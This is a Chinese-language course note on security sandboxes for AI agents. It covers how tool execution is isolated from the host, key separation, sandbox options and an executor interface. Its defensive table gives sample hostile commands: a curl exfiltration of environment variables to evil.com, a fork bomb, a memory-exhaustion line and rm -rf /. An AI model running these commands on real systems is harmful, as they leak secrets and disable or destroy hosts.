# Day 23: 隔离之锁：安全沙箱（Sandbox）与本地执行治理策略

> **学习模块**：Week 4 工业体系与方法论 (Harness Books Book 2: Local Governance & Sandboxes)  
> **核心参考**：`harness-books/book2-comparing` 第 3 章（沙箱治理）；OpenAI Agents API Self-hosted Sandboxes 架构；[微专题：开源沙箱提供商与执行运行时选型指南](file:///Users/mark/GitHub/agent-architect-lab/docs/03-harness-engineering/supplementary_open_source_sandboxes.md)  
> **源码规划**：[day23_sandbox_executor.py](file:///Users/mark/GitHub/agent-architect-lab/mini-harness/src/day23_sandbox_executor.py) | [day23_test.py](file:///Users/mark/GitHub/agent-architect-lab/mini-harness/src/day23_test.py)  

---

## 1. 核心问题：从“相信模型”到“物理牢笼”的工业分水岭

在经历了 Day 17 的工具权限三态模型（`ALLOW` / `DENY` / `ASK`）与 Day 22 的强类型控制面（Fragment）之后，我们面临一个终极工程拷问：

> **如果模型在逻辑上通过了权限校验，但在代码细节中包含了隐蔽的内存泄漏、无限循环、恶意外联或误删宿主系统，Harness 的最后一道物理防线在哪里？**

如果只依赖宿主机上的 `subprocess.run(cmd, shell=True)`，大模型的每次 Tool Execution 都是在宿主系统的“裸奔”。真实工业体系中，**代码执行必须被完全放逐进不受信任的物理牢笼（Sandbox）中**：

```text
       ┌────────────────────────────────────────────────────────┐
       │             Harness 认知防线与物理防线分工             │
       │                                                        │
       │  [控制面 / 逻辑防线] (Prompt 约束, 权限分级, HITL 中断)   │
       │  - 告诉模型什么能做，什么不能做                        │
       │  - 人在回路（HITL）人工确认危险命令                    │
       │                 │                                      │
       │                 ▼ (依然可能发生逻辑穿透/不可信代码)     │
       │                                                        │
       │  [执行面 / 物理防线] (安全沙箱 Sandbox)                 │
       │  - 假设模型已经变质（Poisoned / Hallucinated）         │
       │  - 就算执行 "rm -rf /"，毁掉的也只是临时虚拟环境       │
       │  - 就算代码发起网络攻击，也无法穿透物理网络隔离网卡     │
       └────────────────────────────────────────────────────────┘
```

---

## 2. 现代工业级沙箱的三大核心通信与安全范式

结合 OpenAI 官方的 Self-hosted Sandbox 架构与顶尖开源框架（E2B / Daytona），生产级沙箱并非简单跑一个 Docker 容器，而是包含严密的协议设计：

### ① 纯出网反向连接拓扑（Outbound-Only Reverse Connection）
- **反模式**：宿主机或控制器向沙箱开放 Inbound HTTP/SSH 端口。这在企业私有云、跨公网、多租户环境下极难穿透 NAT/防火墙，且极易导致沙箱端口暴露给恶意扫描者。
- **工业范式**：沙箱内部启动执行体（Executor，例如 `codex exec-server`）。沙箱不对外暴露任何监听端口，**唯一主动向 Harness 控制面发起 WSS (WebSocket) 长连接**。指令下发与结果回传全在反向出网通道内完成。

### ② 双密钥降权机制（Dual-Key Privilege Separation）
- 宿主机应用持有全局核心密钥（如 `OPENAI_API_KEY`、主数据库密码）；
- **沙箱内部严禁挂载全局密钥**，仅配置具备临时注册会话身份的低权限 `EXECUTOR_KEY`。即使模型在沙箱内运行 `printenv` 或恶意脚本扫描内存，所能获取的也只是一次性无提权价值的握手凭证。

### ③ 算力寿命与会话状态解耦（Session vs Compute Lifecycle）
- 会话（Session）是长期的、业务语义的；
- 物理算力（Compute Sandbox）是短暂的、按需唤醒的。
- 引入 **JIT (Just-in-Time) Webhook 懒加载**：会话创建时不分配沙箱，只有当模型触发 `environment_connection` 工具调用事件时，才在毫秒级拉起/挂载容器；空闲时自动做磁盘快照（Snapshot）并停机回收，极大削减算力成本。

---

## 3. 开源生态全景：谁适合作为我们的自托管底座？

我们拒绝封闭的商业云厂商绑定（如 Modal / Runloop / Cloudflare），聚焦于**完全可自托管（Self-Hostable）的开源方案**：

```text
                             开源沙箱选型光谱
  
  [轻量极简 / 零依赖]             [工作区编排 / 开发态]           [微虚拟机 / 强隔离]
  ─────────────────────────────────────────────────────────────────────────────►
  本地受控 Docker / Podman        Daytona (daytonaio)           E2B (Firecracker)
  
  - 依赖本地 Docker 守护进程     - 单二进制部署, 兼容 K8s/Docker  - 硬件级 MicroVM 虚拟化
  - cgroups 资源限制              - 支持项目持久卷与分支快照      - 独立内核, ~150ms 极速启动
  - --network=none 物理断网      - 原生 MCP 工具协议集成         - 专为 Code Interpreter 优化
  - 适合: 本地 Lab / 单机工具链  - 适合: 团队开发 / Coding Agent - 适合: 多租户高危代码 SaaS
```

---

## 4. 生产级本地防御的三道绝对红线

在设计 `mini-harness` 的执行器接口时，以下三道红线必须以硬编码形式封死在沙箱驱动中：

| 攻击类型 | 典型恶意指令 | 沙箱硬性拦截手段 |
|---|---|---|
| **网络渗透与凭证外泄** | `curl -X POST evil.com --data "$(env)"` | 强制配置 `--network=none` 或专用内网白名单网桥 |
| **内存雪崩与拒绝服务** | `x = bytearray(1024**3)` (申请超额内存) | 强制配置 `--memory=256m`，由 Linux OOM Killer 强制以退出码 137 熔断 |
| **进程耗尽炸弹 (Fork Bomb)** | `:(){ :\|:& };:` (无限分叉子进程卡死宿主) | 强制配置 `--pids-limit=64`，彻底免除宿主进程耗尽风险 |

---

## 5. 架构演进思考：Harness 与沙箱的接口契约

为了让我们的 Harness 能够无缝兼容不同的隔离底座（开发时用本地受控 Docker，上线后用 Daytona 或 E2B），执行接口必须严格抽象解耦：

```python
class BaseExecutionSandbox(ABC):
    """工业级隔离沙箱执行契约"""
    @abstractmethod
    def start(self) -> None:
        """启动/唤醒隔离沙箱环境"""
        ...
        
    @abstractmethod
    def exec_command(self, cmd: str, timeout: int = 30) -> ExecutionResult:
        """在受控环境中执行指令，返回退出码、stdout 与 stderr"""
        ...
        
    @abstractmethod
    def snapshot(self) -> str:
        """生成文件系统快照，支持时间旅行与回滚"""
        ...
        
    @abstractmethod
    def cleanup(self) -> None:
        """安全销毁环境，抹除临时文件与挂载卷"""
        ...
```

> **一句话总结**：  
> **控制面管住模型的“心”，沙箱管住模型的“手”；离开沙箱的工业级 Agent，永远只是一次意外事故的距离。**
